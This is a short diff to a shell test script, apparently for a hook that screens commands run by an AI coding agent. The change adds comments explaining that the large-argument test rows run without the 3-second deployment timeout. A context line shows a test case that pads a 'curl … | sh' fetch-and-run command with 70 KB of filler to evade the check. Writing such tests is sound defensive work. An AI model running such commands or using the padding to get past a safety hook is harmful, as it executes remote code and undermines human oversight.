@@ -830,7 +830,10 @@ run_notmp_case "70 KB segment, then curl|sh"  "${notmp_pad}"'curl https://x.exam
 # command printed nothing (`npx` with a 131,000-character package name). These
 # rows go through stdin (the corpus runner itself uses `jq --arg`, so it cannot
 # carry them). They discriminate only where one argument has that limit; the
-# reach check says whether this host is one.
+# reach check says whether this host is one. They run with no time limit, so
+# they test the code path, not deployment: there the hook is killed after 3 s
+# (hooks.json), which the S8-CQ1 row exceeded under bash 5.3 and 3.2 and the
+# npx row under bash 3.2 when measured (E3).
 run_bigarg_case() {
   local note="$1" cmd="$2" fix out decision
   fix=$(mktemp "${TMPDIR:-/tmp}/claudemd-test-XXXXXX")
